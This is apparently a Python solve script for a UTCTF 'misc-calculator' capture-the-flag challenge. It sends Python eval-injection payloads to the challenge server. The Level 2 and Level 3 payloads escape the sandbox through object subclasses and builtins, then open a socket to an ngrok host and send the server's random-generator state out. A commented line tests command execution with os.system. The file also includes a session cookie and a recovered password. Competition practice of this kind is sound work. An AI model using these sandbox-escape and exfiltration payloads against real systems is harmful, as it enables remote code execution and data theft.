import requests

# Level 2
payload = "int([[x.connect(('8.tcp.ngrok.io', 15754)), x.send(bytes(str(__import__('random').getstate()), 'UTF-8')), x.recv(20), x.close()] for x in [__import__('socket').socket()]][0][2])"
# Writeup: 1364310140, correct!  The password is &#x27;E46Dnqb5enAMgGArbruu&#x27;.

# Level 3
payload = "{x.__name__: x for x in ().__class__.__base__.__subclasses__()}['catch_warnings']()._module.__builtins__['int']([[x.connect(('0.tcp.ngrok.io', 12851)), x.send({x.__name__: x for x in ().__class__.__base__.__subclasses__()}['catch_warnings']()._module.__builtins__['bytes']({x.__name__: x for x in ().__class__.__base__.__subclasses__()}['catch_warnings']()._module.__builtins__['str']({x.__name__: x for x in ().__class__.__base__.__subclasses__()}['catch_warnings']()._module.__builtins__['__import__']('random').getstate()), 'UTF-8')), x.recv(20)] for x in [{x.__name__: x for x in ().__class__.__base__.__subclasses__()}['catch_warnings']()._module.__builtins__['__import__']('socket').socket()]][0][2])"

# Test basic eval RCE
# payload = """__import__('os').system('ls -l') """

cookies = {
    'misc-calculator-session': 'ykjmkldtfaTnajzaT9n881ccysSZMb4W6dCj0I/0RFs=jC0XEvsp32FsLkMKBaTCshkJBWfzWIBzut4rRy+FI3IuKcPlhJAa9YW6iKqcyzfw3Jrtm/SnZzLhOLdpBsZDXg==',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'en',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    # 'Cookie': 'misc-calculator-session=M/txlrbEEpLk+Iv64KEqFQlq9KYjieF3cH4K9/CxWCc=/b9Y2RUrfAdLv0BkRSP2C/AUeWhLxQrQHJZD+m8eJKBfWmJE2/cqPd8Niv7aWsmG+yo7iRdpskmoXHln1lztag==',
    'Origin': 'http://guppy.utctf.live:5957',
    'Referer': 'http://guppy.utctf.live:5957/',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
}

data = {
    'expression': payload,
    'type': 'calculate',
    'level': '3',
}

response = requests.post('http://guppy.utctf.live:5957/', cookies=cookies, headers=headers, data=data, verify=False)

print(response.status_code)
print(response.text)